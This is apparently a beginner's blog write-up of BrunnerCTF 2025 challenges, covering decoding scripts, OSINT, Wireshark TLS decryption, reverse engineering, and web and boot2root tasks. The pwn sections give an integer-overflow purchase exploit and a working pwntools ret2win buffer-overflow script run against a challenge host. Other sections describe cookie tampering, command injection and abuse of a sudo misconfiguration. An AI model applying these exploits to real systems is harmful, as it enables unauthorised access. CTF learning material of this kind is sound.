---
title: "Brunner CTF"
date: 2025-08-24 01:09:33 +0300
comments: true
description: A beginner-friendly journey through BrunnerCTF 2025â€™s â€œShake & Bakeâ€ challenges, covering misc, OSINT, web, crypto, forensics, boot2root, pwn, and reverse engineering.
image: /images/BrunnerCTF/Banner.png
categories: [misc, osint, web, crypto, forensics, boot2root, pwn, reverse engineering, B2R]
tags:  [misc, osint, web, crypto, forensics, boot2root, pwn, reverse engineering, B2R]
featureimage: "https://ctftime.org/media/team/logo_-_v1010x.png"
---

# Cooking Flags with BrunnerCTF 2025 - A Beginnerâ€™s Feast

Get your aprons on and terminals ready - the BrunnerCTF has just served up its very first edition, and I couldnâ€™t resist grabbing a plate! ðŸ½ï¸

This CTF brought a flavorful mix of challenges, from web and OSINT to forensics, crypto, reverse engineering, and even some pwn and boot2root fun. While there were plenty of spicy dishes for the seasoned pros, I stuck to the â€œShake & Bakeâ€ menu - a perfect selection of beginner-friendly challenges designed to teach and entertain.

In this post, Iâ€™ll walk you through my journey solving most of the beginner tasks across categories like misc, OSINT, web, crypto, forensics, boot2root, pwn, and reverse engineering. Along the way, Iâ€™ll share my thought process, lessons learned, and tips you can use if youâ€™re just getting started with CTFs.

# Sanity Check - misc

I found this flag by just reading the challenge description... Here is a snip from the last part of that challenge description:

```plaintext
Let's Go!
Before you move on, please read the rules of the CTF carefully. They contain important notes on what you're allowed to and not.

Then, submit the following flag:
`brunner{n0w-y0u-kn0w-y0ur-C-T-F}`
```
![chall_desc](https://gist.github.com/user-attachments/assets/823be032-c173-4082-88b2-f975ea545915)

# Based Brunner - misc

This was the challenge description:
![chall_desc](https://gist.github.com/user-attachments/assets/c7c42a5f-df7f-458a-a298-34eac45237a3)

The zip file attached to the challenge had the following highlighted files:
![files](https://gist.github.com/user-attachments/assets/dd322cd9-d80d-4ddc-8cb8-e5c9225fb212)

The `based.txt` file had long lines of binary code. This was the content of the `encode.py` file:

```python
def encode_char(ch: str, base: int) -> str:
    """
    Encode a single character into a string of digits in the given base
    """
    value = ord(ch)
    digits = []
    while value > 0:
        digits.append(str(value % base))
        value //= base

    return "".join(reversed(digits))


with open("flag.txt") as f:
    text = f.read().strip()

# Encode the text with all bases from decimal to binary
for base in range(10, 1, -1):
    text = " ".join(encode_char(ch, base) for ch in text)

with open("based.txt", "w") as f:
    f.write(text)
```

## Understand the Encoding

The provided script encode.py converts the flag into different number bases, starting from base 10 down to base 2:
```python
for base in range(10, 1, -1):
    text = " ".join(encode_char(ch, base) for ch in text)
```

- First, each character is turned into a number (ord(ch) gives the ASCII number).

- Then, itâ€™s converted into base 10, then base 9, then base 8, and so onâ€¦ until base 2.

At every step, numbers are joined with spaces.

Example of encoding a single letter:

- 'A' â†' 65 (base 10)
- 65 â†' 71 (base 9)
- 71 â†' 105 (base 8)
...

eventually a string of 1s and 0s for base 2.

## Plan for Decoding

To reverse the encoding, just reverse the steps:

- Start from base 2, go up layer by layer until base 10.
- Convert each group back to integers, then to characters, at each step.

## The Decoder Script

Hereâ€™s the script that worked:
```python
def decode_layer(encoded_text, base):
    """Decode one layer of the encoding for a given base."""
    decoded_chars = []
    for chunk in encoded_text.split():
        decoded_chars.append(chr(int(chunk, base)))
    return "".join(decoded_chars)

with open("based.txt") as f:
    text = f.read().strip()

# Reverse the encoding: base 2 â†' base 10
for base in range(2, 11):
    text = decode_layer(text, base)

print("Flag:", text)
```

## How It Works

- split() breaks the string by spaces to isolate each encoded character.
- int(chunk, base) converts that chunk from the current base to an integer.
- chr() converts the integer to the corresponding ASCII character.
- Loop from base 2 up to 10, one layer at a time.

Flag: `brunner{1s_b4s3d}`

# The Baking Case - misc 

We're given the text:
```plaintext
i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHaN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings
```

The phrase â€œbit by bitâ€ is the key hint: think binary. The oddly mixed upper/lower casing suggests a case-stego scheme (uppercase to 1, lowercase to 0). ChatGPT was able to come up with a script to decode this:

```python
text = ("i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear "
"THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt "
"oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO "
"sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHaN "
"mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS "
"ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh "
"MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe "
"yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings")

# 1) Keep letters only
letters = [c for c in text if c.isalpha()]

# 2) Map case -> bits (lower=0, upper=1)
bits = ''.join('1' if c.isupper() else '0' for c in letters)

# 3) Chop into bytes
bytes8 = [bits[i:i+8] for i in range(0, len(bits), 8)]
bytes8 = [b for b in bytes8 if len(b) == 8]   # drop incomplete trailing bits

# 4) ASCII decode
decoded = ''.join(chr(int(b, 2)) for b in bytes8)
print(decoded)
```
The script is looking for a hidden message in the weirdly capitalized paragraph. It does this by turning capital and lowercase letters into binary (1s and 0s), grouping them into bytes, and then decoding those bytes into text.

To keep only letters:
```letters = [c for c in text if c.isalpha()]```

The script removes everything thatâ€™s not a letter (like spaces or punctuation).

So "i UseD to coDE..." becomes a long string like:
"iUseDtocoDEliKe..."

It then turns letter casing into binary (0s and 1s)
```bits = ''.join('1' if c.isupper() else '0' for c in letters)```

- Every uppercase letter â†' 1

- Every lowercase letter â†' 0

Example:

"iUseD" â†' "0 1 0 1 1"

At this point, the script has a very long chain of binary digits (1s and 0s).

It then goes ahead to group into chunks of 8 bits (bytes)
```python
bytes8 = [bits[i:i+8] for i in range(0, len(bits), 8)]
bytes8 = [b for b in bytes8 if len(b) == 8]
```

Computers read text in bytes â€" groups of 8 bits.

This step splits the binary string into 8-bit groups.

Any extra bits at the end that donâ€™t make a full byte are thrown away.

Example:

"01000001 01100010 01100011 ..."

Then it decodes binary into text
```python
decoded = ''.join(chr(int(b, 2)) for b in bytes8)
print(decoded)
```
Each 8-bit binary number is converted into its ASCII character.

- "01000001" â†' A
- "01100010" â†' b
- "01100011" â†' c

This reveals the hidden message.
When I saved and ran the script, it outputted this:
![flag](https://gist.github.com/user-attachments/assets/85cb66f3-4098-4dda-8310-203368e8b70d)

Flag: `brunner{I_like_Baking_More_That_Programming}`

# Shaken, Not Stirred - crypto

## Challenge Description

The challenge gave a fun story:
After all that cake, it's time for a drink ðŸ¸. But wait, the bartender added a strange â€œsecret ingredient.â€ Can we figure out what it is?
We were also provided with some scrambled text:
![EncryptedText](https://gist.github.com/user-attachments/assets/c102a48c-07ce-4b29-aa3b-27a2de6025af)

and a Python script that performed the encryption.

## Looking at the Code

Hereâ€™s the core part of the script that does the â€œmixingâ€:
```python
shaker = 0
for ingredient in ingredients:
    shaker ^= len(ingredient) * random.randrange(18)

with open("flag.txt", "rb") as f:
    secret = f.read().strip()

drink = bytes([b ^ shaker for b in secret])
```

Breaking this down:

- shaker starts at 0.

For each ingredient, the script:

- Takes the length of the ingredient string.
- Multiplies it by a random number between 0 and 17.
- XORs (^=) the result with the current shaker value.

Finally, every byte of the flag is XORed with the shaker value to produce the ciphertext.

## Key Observations

XOR encryption is being used.

The shaker (key) is just a number.

Even though random.randrange(18) is called, thereâ€™s no seed specified. But importantly, the final key will always be a number between 0 and 255 because of how XOR works with bytes.

So, if we donâ€™t know the key - brute-forcing all 256 possibilities is quick and easy.

## Brute-forcing the Key

Hereâ€™s the brute-force script I used:
![Script](https://gist.github.com/user-attachments/assets/c1783039-50a1-4f45-9a99-94f2475cda11)

When running it, the readable candidate that stood out was:
![Flag](https://gist.github.com/user-attachments/assets/dfb3fb4b-8854-4358-95e6-0816e786f7c3)

And just like that - we have the flag!

## The Flag
`brunner{th3_n4m3's_Brunn3r...J4m3s_Brunn3r}`

# There Is a Lovely Land - osint

There was a challenge description with a zip file attached to it that when extracted had an image:
![chall_desc](https://gist.github.com/user-attachments/assets/0d156b78-f495-4bed-a85a-03a482c4fc25)

I downloaded the file and extracted it to find this image:
![SomeBridge](https://gist.github.com/user-attachments/assets/509ccb22-7225-4cf5-bc7d-a763c5c8d749)

I used the image to do a reverse image search on google and found a hit for visual matches with the name of the bridge:
![visual_match](https://gist.github.com/user-attachments/assets/0c334bc2-4351-41c4-9b9b-0b29f749f88f)

I found a hit. So I submitted the flag: `brunner{storebÃ¦ltsbroen}`

# Train Mania - osint

## Description
I recently stumpled upon this cool train! But I'd like to know a bit more about it... Can you please tell me the operating company, model number and its maximum service speed (km/h in regular traffic)?

The flag format is brunner{OPERATOR-MODELNUMBER-SERVICESPEED}.
So if the operator you have found is DSB, the model number RB1, and the maximum service speed is 173 km/h, the flag would be brunner{DSB-RB1-173}.

A zip file was attached to this challenge and it had a video, I played it and paused it almost at the end as I had noticed something unique about the train, a logo:
![Train_logo](https://gist.github.com/user-attachments/assets/42b88e67-7e69-49a4-8077-27d85f6b68bc)

Once again I did a reverse image search with google and saw this:
![Reverse_search](https://gist.github.com/user-attachments/assets/9076594f-bfab-469e-8409-99b259ad4242)

So I start searching for that specific model of the train online and find some sources with good info:
- https://en.wikipedia.org/wiki/X_2000
- https://www.railvolution.net/news/sj-class-x2000-modernisation-progress

I used that info to assemble the flag: `brunner{SJ-X2-200}`

# DoughBot - forensics


This was the challenge description:
![Chall_Desc](https://gist.github.com/user-attachments/assets/0122dc35-2b6d-49af-9905-080b2c56b8de)

We were given a zip file to download, which I downloaded and unzipped then tried to understand the kind of file this was and it turned out to be a windows initialization file. I then read its contents and saw what looked like an encoded flag:
![Discovering_flag](https://gist.github.com/user-attachments/assets/6483ce0a-2c74-4eba-8f32-774ac32824fc)

I then copied the encoded string and tried to identify the cipher used:
![Dcode](https://gist.github.com/user-attachments/assets/ced78c38-554a-4df3-a99d-33d2a2429101)

Turns out, this was a base64 string, I proceeded to cyberchef to decode it:
![CyberChef](https://gist.github.com/user-attachments/assets/d2de3510-e272-4e54-995a-e5bbc406df2a)

Flag: `brunner{m1x3d_s1gnals_4_sure}`

# The Secret Brunsviger - forensics

Here is the challenge description:
![chall_desc](https://gist.github.com/user-attachments/assets/54499c61-f752-48e8-a7c4-e11c1a6a0284)

The ZIP file provided, contained two files, `traffic.pcap` file and another file called `keys.log`. I opened the PCAP file with wireshark and tried to follow the traffic from one of the packets and it was all encrypted and therefore couldnt see anything to work with.

I then decided to try and use the other file as the key to decrypt the traffic. To do that I followed these steps:

- Go to `Edit â†' Preferences â†' Protocols â†' TLS`
- Set (Pre)-Master-Secret log filename to the path of keys.log

This has partly been illustrated below:
![loading_key](https://gist.github.com/user-attachments/assets/80b19fcc-1d16-4604-a9f9-926d0e8e14e4)

Once the key is loaded, I proceeded to apply a filter for HTTP traffic and follow the traffic once again from one of the packets:
![following](https://gist.github.com/user-attachments/assets/3eb0cd5d-d53d-4458-b691-c1f27815221b)

It looked like a conversation among chefs, that led to this:
![Encoded_flag](https://gist.github.com/user-attachments/assets/af9cbd63-5c43-4dc5-aa1a-26ec5d0aa653)

This looks like an encoded flag. Let's decode it from CyberChef:
![Decoded_Flag](https://gist.github.com/user-attachments/assets/b19f2453-e077-4a39-bbfe-0203106d9298)

Flag: `brunner{S3cr3t_Brunzv1g3r_R3c1p3_Fr0m_Gr4ndm4s_C00kb00k}`

# Online Cake Flavour Shop - pwn

This was the challenge description:
![Desc](https://gist.github.com/user-attachments/assets/d05e2c65-156e-4290-9d7b-b6a3509984e2)

We were given an instance to connect to and a file to download. The file had some code in C:

```
#include <stdio.h>
#include <stdlib.h>

#define FLAG_COST 100
#define BRUNNER_COST 10
#define CHOCOLATE_COST 7
#define DRÃ˜MMEKAGE_COST 5

int buy(int balance, int price) {
    int qty;
    printf("How many? ");
    scanf("%u", &qty);

    int cost = qty * price;
    printf("price for your purchase: %d\n", cost);

    if (cost <= balance) {
        balance -= cost;
        printf("You bought %d for $%d. Remaining: $%d\n", qty, cost, balance);
    } else {
        printf("You can't afford that!\n");
    }

    return balance;
}

void menu() {
    printf("\nMenu:\n");
    printf("1. Sample cake flavours\n");
    printf("2. Check balance\n");
    printf("3. Exit\n");
    printf("> ");
}

unsigned int flavourMenu(unsigned int balance) {
    unsigned int updatedBalance = balance;

    printf("\nWhich flavour would you like to sample?:\n");
    printf("1. Brunner ($%d)\n", BRUNNER_COST);
    printf("2. Chocolate ($%d)\n", CHOCOLATE_COST);
    printf("3. DrÃ¸mmekage ($%d)\n", DRÃ˜MMEKAGE_COST);
    printf("4. Flag Flavour ($%d)\n", FLAG_COST);
    printf("> ");

    int choice;
    scanf("%d", &choice);

    switch (choice)
    {
    case 1:
        updatedBalance = buy(balance, BRUNNER_COST);
        break;
    case 2:
        updatedBalance = buy(balance, CHOCOLATE_COST);
        break;
    case 3:
        updatedBalance = buy(balance, DRÃ˜MMEKAGE_COST);
        break;
    case 4:
        unsigned int flagBalance;
        updatedBalance = buy(balance, FLAG_COST);
        if (updatedBalance >= FLAG_COST) {
            // Open file and print flag
            FILE *fp = fopen("flag.txt", "r");
            if(!fp) {
                printf("Could not open flag file, please contact admin!\n");
                exit(1);
            }
            char file[256];
            size_t readBytes = fread(file, 1, sizeof(file), fp);
            puts(file);
        }
        break;
    default:
        printf("Invalid choice.\n");
        break;
    }

    return updatedBalance;
}

int main() {
    int balance = 15;
    int choice;

    printf("Welcome to Overflowing Delights!\n");
    printf("You have $%d.\n", balance);

    while (1) {
        menu();
        scanf("%d", &choice);

        switch (choice)
        {
        case 1:
            balance = flavourMenu(balance);
            break;
        case 2:
            printf("You have $%d.\n", balance);
            break;
        case 3:
            printf("Goodbye!\n");
            exit(0);
            break;
        default:
            printf("Invalid choice.\n");
            break;
        }
    }
    return 0;
}
```
## The scenario

You have an online cake shop program. You start with $15:

You can â€œsampleâ€ different cake flavours:

- Brunner ($10)

- Chocolate ($7)

- DrÃ¸mmekage ($5)

- Flag Flavour ($100) â€" this is what we want.

The program asks how many of a flavour you want to buy, calculates the total cost, and checks if you can afford it.

## Spot the vulnerability

Hereâ€™s the key code from shop.c:
```
int buy(int balance, int price) {
    unsigned int qty;
    scanf("%u", &qty);           // user enters quantity
    int cost = qty * price;      // calculate total cost
    if (cost <= balance) { ... }
    return balance - cost;
}
```

## Observations

- qty is unsigned int (cannot be negative, very large possible values)

- cost is signed int (can be negative or positive)

- balance is signed int

This combination can lead to an integer overflow.

### What is integer overflow?

Think of integers in C as containers with a maximum size. For a 32-bit signed integer:

- Max value = 2,147,483,647
- Min value = -2,147,483,648

If you calculate a number larger than 2,147,483,647, it wraps around and becomes negative.

- Example: 2,147,483,648 â†' -2,147,483,648

This is like an odometer rolling over.

## How I exploited it

I wanted to buy the Flag Flavour ($100), but our balance is only $15.

**Step 1: Enter a very large quantity for the flag:** 
qty = 21,474,837

**Step 2: Calculate cost:**

- cost = qty * 100
- cost = 21,474,837 * 100
- cost = 2,147,483,700  â†' overflow â†' -2,147,483,596


**Step 3: Updated balance:**

- updatedBalance = balance - cost
- updatedBalance = 15 - (-2,147,483,596)
- updatedBalance = 2,147,483,611

Now updatedBalance > FLAG_COST, so the program thinks you can afford the flag and prints it!

![Flag](https://gist.github.com/user-attachments/assets/ecc993ca-2d35-4d44-9c49-a136b25f1da9)

Flag: `brunner{wh0_kn3w_int3g3rs_c0uld_m4k3_y0u_rich}`

# Dat Overflow Dough - pwn

Challenge Link: ncat --ssl dat-overflow-dough-b9ac089d9249f9ee.challs.brunnerne.xyz 443

## Reading the Challenge

The description hinted at something familiar in binary exploitation:

`"Intern wrote C code using unsafe functions... accidentally pushed to production... could leak our secret recipe."`

Translation?
`Somewhere in the binary, there's a buffer overflow â€" most likely caused by using gets() or similar unsafe functions. Perfect for a ret2func exploit.`

## Inspecting the Source Code

The provided `recipe.c` code snippet showed this:
```
void vulnerable_dough_recipe() {
    char recipe[16];
    puts("Please enter the name of the recipe you want to retrieve:");
    gets(recipe);  // âš ï¸ Dangerous! No length check
}
```

Key things to note:

- Buffer size is 16 bytes.
- Uses gets(), which doesnâ€™t stop reading, allowing overflow.
- Thereâ€™s a hidden function:
```
void secret_dough_recipe(void) {
    int fd = open("flag.txt", O_RDONLY);
    sendfile(1, fd, NULL, 100);
}
```

If we overwrite the return address to point to this function, weâ€™ll get the flag.

## Static Binary Analysis

Before writing an exploit, I checked protections:
```
$ checksec recipe
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

- NX enabled â†' we canâ€™t inject shellcode, but we can reuse code (return-to-function).
- No PIE â†' function addresses donâ€™t change between runs.
- No canary â†' no stack protections to bypass.

This screamed classic ret2win.

## Finding the Offset

From the source:

- Buffer size: 16 bytes
- Saved RBP: 8 bytes
- Return address overwrite begins after 16 + 8 = 24 bytes.

## Writing the Exploit

Hereâ€™s the final Python exploit with pwntools:
```python
#!/usr/bin/env python3
from pwn import *
import argparse

RECIPE_BUFFER_SIZE = 16
RBP_SIZE = 8
PROMPT = "Please enter the name of the recipe you want to retrieve:"

parser = argparse.ArgumentParser()
parser.add_argument("--remote", help="remote target in form host:port", default=None)
args = parser.parse_args()

e = ELF("./recipe")

if args.remote:
    host, port = args.remote.split(":")
    port = int(port)
    io = remote(host, port, ssl=True)
    SECRET_ADDRESS = e.symbols['secret_dough_recipe']
else:
    io = e.process()
    SECRET_ADDRESS = e.symbols['secret_dough_recipe']

log.info(f"Using secret address: {hex(SECRET_ADDRESS)}")

payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```
## Exploiting the Remote Service

With everything ready, I ran:
```bash
python3 exploits.py --remote dat-overflow-dough-b9ac089d9249f9ee.challs.brunnerne.xyz:443
```

Output:
```plaintext
[*] Using secret address: 0x4011b6
[*] Switching to interactive mode

brunner{b1n4ry_eXpLoiTatioN_iS_CooL}
```

Success â€" we hijacked the return pointer and jumped straight into the secret_dough_recipe function, printing the flag.
Flag: `brunner{b1n4ry_eXpLoiTatioN_iS_CooL}`

# Baker Brian - reverse engineering

This was the challenge description:
![chall_desc](https://gist.github.com/user-attachments/assets/87dc1b3e-1f95-44a0-9bea-2d40ef449c5b)

Notice that we need to download the file attached and also connect to the challenge. I downloaded the zip file, unzipped it and found the python script below:
```python
cat auth.py 
print("""
              ðŸŽ‚ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸŽ‚
              ðŸ°                            ðŸ°
              ðŸ°  Baker Brian's Cake Vault  ðŸ°
              ðŸ°                            ðŸ°
              ðŸŽ‚ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸŽ‚
""")

# Make sure nobody else tries to enter my vault
username = input("Enter Username:\n> ")
if username != "Br14n_th3_b3st_c4k3_b4k3r":
    print("âŒ Go away, only Baker Brian has access!")
    exit()

# Password check if anybody guesses my username
# Naturally complies with all modern standards, nothing weak like "Tr0ub4dor&3"
password = input("\nEnter password:\n> ")

# Check each word separately
words = password.split("-")

# Word 1
if not (
    len(words) > 0 and
    words[0] == "red"
):
    print("âŒ Word 1: Wrong - get out!")
    exit()
else:
    print("âœ… Word 1: Correct!")

# Word 2
if not (
    len(words) > 1 and
    words[1][::-1] == "yromem"
):
    print("âŒ Word 2: Wrong - get out!")
    exit()
else:
    print("âœ… Word 2: Correct!")

# Word 3
if not (
    len(words) > 2 and
    len(words[2]) == 5 and
    words[2][0] == "b" and
    words[2][1] == "e" and
    words[2][2:4] == "r" * 2 and
    words[2][-1] == words[1][-1]
):
    print("âŒ Word 3: Wrong - get out!")
    exit()
else:
    print("âœ… Word 3: Correct!")

# Word 4
if not (
    len(words) > 3 and
    words[3] == words[0][:2] + words[1][:3] + words[2][:3]
):
    print("âŒ Word 4: Wrong - get out!")
    exit()
else:
    print("âœ… Word 4: Correct!")

# Password length
if len(password) != len(username):
    print("âŒ Wrong password length, get out!")
    exit()

# Nobody will crack that password, access can be granted
print("\nWelcome back, Brian! Your vault has been opened:\n")
with open("cake_vault.txt") as f:
    print(f.read())

```
When I connected to the challenge, I was prompted to give a username, so I went back to the script and read it to find a hardcoded username:
`Br14n_th3_b3st_c4k3_b4k3r`. On pressing enter, I was asked for a password.

From the script, we note that the password is split by hyphens into 4 words:

```python
words = password.split("-")
```
So the format is: word1-word2-word3-word4

## Word 1 Analysis
```python
if not (
    len(words) > 0 and
    words[0] == "red"  # Direct comparison
):
```
âœ… Word 1 = `red` (exact match required)

## Word 2 Analysis
```python
if not (
    len(words) > 1 and
    words[1][::-1] == "yromem"  # Reverse of word2 should equal "yromem"
):
Reverse "yromem" = "memory" (Python string reversal: [::-1])
```
âœ… Word 2 = memory

### Word 3 Analysis (Most Complex)
```python
if not (
    len(words) > 2 and
    len(words[2]) == 5 and           # Must be 5 characters long
    words[2][0] == "b" and           # 1st character: 'b'
    words[2][1] == "e" and           # 2nd character: 'e'  
    words[2][2:4] == "r" * 2 and     # Characters 2-3 (index 2 & 3): "rr"
    words[2][-1] == words[1][-1]     # Last character equals last char of word2
):
```
Let's break this down:

- Length must be 5: _ _ _ _ _
- Position 0: b â†' b_ _ _ _
- Position 1: e â†' be_ _ _
- Positions 2-3: rr â†' berr_
- Position 4 (last char): must equal last char of word2 ("memory" â†' 'y') â†' berry

âœ… Word 3 = berry

## Word 4 Analysis
```python
if not (
    len(words) > 3 and
    words[3] == words[0][:2] + words[1][:3] + words[2][:3]
): 
```
Break down the concatenation:

- words[0][:2] = First 2 chars of "red" â†' "re"
- words[1][:3] = First 3 chars of "memory" â†' "mem"
- words[2][:3] = First 3 chars of "berry" â†' "ber"

Combine: "re" + "mem" + "ber" = "remember"

âœ… Word 4 = remember

## Final Password Construction
Combine all words with hyphens:

Word 1: red

Word 2: memory

Word 3: berry

Word 4: remember

âœ… Password = red-memory-berry-remember

I then keyed this in and got the flag:
![flag](https://gist.github.com/user-attachments/assets/1c795c1a-769c-4306-81c4-a309a05b9132)

# Rolling Pin - reverse engineering

Challenge description:
![chall_desc](https://gist.github.com/user-attachments/assets/54499c61-f752-48e8-a7c4-e11c1a6a0284)

File: rolling_pin (64-bit ELF)

## Recon (Understanding the Binary)

First, check what kind of file weâ€™re dealing with:
```bash
file rolling_pin
```
Output: `ELF 64-bit LSB executable, x86-64, dynamically linked, ...`

Cool â€" itâ€™s a 64-bit Linux executable.

## Load it into radare2

We open the file in analysis mode:
```bash
r2 -AA rolling_pin
```

Find the main function:
```bash
afl | grep main
s main
pdf
```
This shows the main logic where the binary checks your input.

## Look for Strings

Check for readable strings:
```bash
iz
```

Found:
```plaintext
Good job!
Try again!
```
This tells us where the program decides if your input is correct or wrong.

## Look at the Data

We inspect memory regions near where the program compares inputs:
```bash
px 32 @ 0x00402010
```

Output:
```plaintext
62e4 d573 e6ac 9cbd 7260 d1a1 4766 d73a
6866 7d23 03ae d934 7d52 6f6c 6c20 7468
```
![GoodJob](https://gist.github.com/user-attachments/assets/1a1f287f-4598-43b3-a84f-0a1cd2f20833)
This is the scrambled flag.

## Understand the Logic

By reading the disassembly, we see the binary:

- Takes your input.
- Rotates each byte to the left by a position based on its index.
- Compares it to the scrambled bytes.

So, to reverse it, we rotate right instead of left.

## Write the Decoder

A simple Python script to reverse the rotation:
```python
data = [0x62, 0xe4, 0xd5, 0x73, 0xe6, 0xac, 0x9c, 0xbd, 0x72, 0x60,
        0xd1, 0xa1, 0x47, 0x66, 0xd7, 0x3a, 0x68, 0x66, 0x7d, 0x23,
        0x03, 0xae, 0xd9, 0x34, 0x7d]

flag = ""
for i, byte in enumerate(data):
    shift = i & 7   # same shift as program but right instead of left
    flag += chr(((byte >> shift) | (byte << (8 - shift))) & 0xFF)

print(flag)
```
Running it gives:`brunner{r0t4t3_th3_d0ugh}`

## Test the Flag

Feed it into the binary:
```plaintext
echo "brunner{r0t4t3_th3_d0ugh}" | ./rolling_pin
```
Output:`Good job!`

# Where Robots Cannot Search - web

Looking at the Chall decription, this hints us to robots.txt:
![Chall_desc](https://gist.github.com/user-attachments/assets/672ebaa4-e60f-4fc4-83f2-003d12196ef2)

So I started the challenge and visited the website, appending the `/robots.txt` extension at the end of the URL and discovered some interesting dissallowed entries:
![robots_ext](https://gist.github.com/user-attachments/assets/e0846cc3-1442-49dd-b74e-5d6cad15701f)

One of them was the `flag.txt` file as highlighted above and when I tried to read it, I found the flag:
![Flag_robots](https://gist.github.com/user-attachments/assets/beab1ffc-5307-46d0-930c-31cea3c31082)

Flag: `brunner{r0bot5_sh0u1d_nOt_637_h3re_b0t_You_g07_h3re}`

# Cookie Jar - web

I opened the challenge description and it looked and sounded like this was a cookie manipulation challenge:
![Chall_Desc](https://gist.github.com/user-attachments/assets/cc2fd448-0724-48f7-b90e-7f2199220dcb)

When I started the challenge and visited the website, I found out that there is a cookie recipe only accessible to premium users. So I inspected the page and looked at the cookies to see what I can find:
![Inspecting_cookies](https://gist.github.com/user-attachments/assets/2a837737-9188-4c83-92c6-ea376f669d2e)

Noticing that the cookie value for `isPremium` has been set to `false`, I changed the value to `true` and refresehed the page. That gave me the flag for this challenge:
![Flag](https://gist.github.com/user-attachments/assets/a47dac56-0775-4a19-954d-5a093f746a3c)

Flag: `brunner{C00k135_4R3_p0W3rFu1_4nD_D3l1c10u5!}`

# Coffee (User) - boot2root

This was the challenge description. The challenge required us to obtain the `user.txt` file:
![chall_desc](https://gist.github.com/user-attachments/assets/82cebf94-8644-46e9-8d6d-3926eb26aa51)

I visited the target and found an ordering management system and started testing it's functionality:
![functionality](https://gist.github.com/user-attachments/assets/fcb590ed-0176-409e-8964-97ff5b0c0e13)

Keying in a number as an order ID like 1, gives us the order status as shown above. After testing for multiple vulnerabilities on that fiels, I realized its vulnerable to Command Injection a illustrated below:

![CMDi_Test](https://gist.github.com/user-attachments/assets/66730a8f-835c-457e-9bfe-3cc24f1f26a9)

This then helped me read the file we are supposed to read for the challenge:
![Flag](https://gist.github.com/user-attachments/assets/e499165e-1793-4f13-84f5-1a509cf625b1)

Flag: `brunner{C0Ff33_w1Th_4_51d3_0F_c0MM4nD_1nj3Ct10n!}`

# Caffeine (Root) - boot2root

This is a continuation of the Caffeine (User) challenge. Here is its description:
![chall_desc](https://gist.github.com/user-attachments/assets/15523d50-9c5d-439b-a268-f51a78bd53e6)

Looks like our goal this time is to escalate privileges and get the root flag. Once again, I visit the challenge page and start to do further enumeration as we had earlier discovered command injection vulnerability on the website:
![sudo_misconfig](https://gist.github.com/user-attachments/assets/536c3868-fb23-4696-b84e-c07268b0e516)

As shown above, I ran `sudo -l` and discovered that our current context user has the ability to run the `brew` binary with elevated privileges without a need for a password. However I didnt know what that binary is used for, so I tried to read its help menu and didn't get anything useful, apart from what seemed like it expected a file as an argument:
![file_arg](https://gist.github.com/user-attachments/assets/c64fa6f5-aea0-477d-be4e-5dbd0f6db079)

I therefore went ahead and supplied the file name of the file we are required to read as the argument and that gave me the flag:
![root_flag](https://gist.github.com/user-attachments/assets/ab154124-c226-440d-bc0e-184d981f7de0)

flag: `brunner{5uD0_pR1V1L3g35_T00_h0t_F0r_J4v4_J4CK!}`


Wrapping up, BrunnerCTF 2025 was a fun and insightful experience that sharpened my problem-solving skills and deepened my understanding of core cybersecurity concepts. The â€œShake & Bakeâ€ challenges were perfect for practicing fundamentals while still offering a few clever twists to keep things exciting. Iâ€™m looking forward to tackling more advanced challenges next time and continuing to refine my skills. Until then â€" happy hacking, and see you in the next CTF!

---
